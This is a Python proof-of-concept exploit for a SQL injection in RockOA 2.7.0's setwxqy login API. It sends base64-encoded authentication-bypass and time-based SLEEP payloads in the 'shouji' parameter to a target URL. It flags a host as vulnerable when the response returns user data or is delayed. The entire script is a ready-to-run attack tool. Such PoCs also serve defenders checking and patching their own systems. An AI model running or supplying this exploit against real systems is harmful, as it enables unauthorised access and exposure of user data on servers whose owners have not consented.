#!/usr/bin/env python3
"""
CVE-2025-63742 - SQL Injection in RockOA 2.7.0
Vulnerable function: setwxqyAction in webmain/task/api/loginAction.php
Vulnerable parameters: shouji, userid (base64 encoded)
"""

import requests
import base64
import argparse
import urllib3
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def encode_payload(payload):
    return base64.b64encode(payload.encode()).decode()


def test_sqli(target_url, timeout=10):
    results = {
        "vulnerable": False,
        "details": []
    }
    
    api_endpoint = f"{target_url.rstrip('/')}/task.php"
    
    print(f"[*] Target: {target_url}")
    print(f"[*] Endpoint: {api_endpoint}")
    print("-" * 50)
    
    payload = "' OR '1'='1"
    encoded_shouji = encode_payload(payload)
    encoded_userid = encode_payload("test")
    
    params = {
        "m": "login|api",
        "a": "setwxqy",
        "shouji": encoded_shouji,
        "userid": encoded_userid,
        "agentid": "1",
        "num": "test"
    }
    
    try:
        print(f"[*] Testing SQL Injection via shouji parameter")
        print(f"    Payload: {payload}")
        print(f"    Encoded: {encoded_shouji}")
        
        response = requests.get(api_endpoint, params=params, timeout=timeout, verify=False)
        
        print(f"    Status: {response.status_code}")
        
        if '"success":true' in response.text and '"user"' in response.text:
            results["vulnerable"] = True
            results["details"].append({
                "payload": payload,
                "response": response.text
            })
            print(f"    [+] VULNERABLE! SQL injection successful")
            print(f"    [+] Response contains user data, bypassed authentication")
        else:
            print(f"    [-] Response: {response.text[:200]}")
            
    except requests.exceptions.RequestException as e:
        print(f"    [!] Request failed: {e}")
    
    print()
    return results


def test_time_based(target_url, timeout=15):
    api_endpoint = f"{target_url.rstrip('/')}/task.php"
    
    print("[*] Testing time-based SQL injection...")
    print("-" * 50)
    
    payload = "' AND SLEEP(3) AND '1'='1"
    encoded_shouji = encode_payload(payload)
    
    params = {
        "m": "login|api",
        "a": "setwxqy",
        "shouji": encoded_shouji,
        "userid": encode_payload("test"),
        "agentid": "1",
        "num": "test"
    }
    
    try:
        start = time.time()
        response = requests.get(api_endpoint, params=params, timeout=timeout, verify=False)
        elapsed = time.time() - start
        
        print(f"    Payload: {payload}")
        print(f"    Response time: {elapsed:.2f}s")
        
        if elapsed >= 2.5:
            print(f"    [+] Time-based SQLi confirmed!")
            return True
        else:
            print(f"    [-] No significant delay")
            
    except requests.exceptions.Timeout:
        print("    [+] Time-based SQLi confirmed (timeout)")
        return True
    except Exception as e:
        print(f"    [!] Error: {e}")
    
    return False


def main():
    parser = argparse.ArgumentParser(description="CVE-2025-63742 RockOA SQL Injection PoC")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://localhost:8080)")
    parser.add_argument("-t", "--timeout", type=int, default=15, help="Request timeout (default: 15)")
    parser.add_argument("--time-based", action="store_true", help="Test time-based SQLi")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("CVE-2025-63742 - RockOA SQL Injection PoC")
    print("Vulnerable: webmain/task/api/loginAction.php (setwxqyAction)")
    print("=" * 60)
    print()
    
    results = test_sqli(args.url, args.timeout)
    
    if args.time_based:
        test_time_based(args.url, args.timeout)
    
    print("=" * 60)
    if results["vulnerable"]:
        print("[+] RESULT: Target is VULNERABLE to SQL Injection!")
        print("[+] CVE-2025-63742 confirmed")
        for detail in results["details"]:
            print(f"[+] Response: {detail['response'][:300]}")
        return 0
    else:
        print("[-] RESULT: Could not confirm vulnerability")
        return 1


if __name__ == "__main__":
    sys.exit(main())
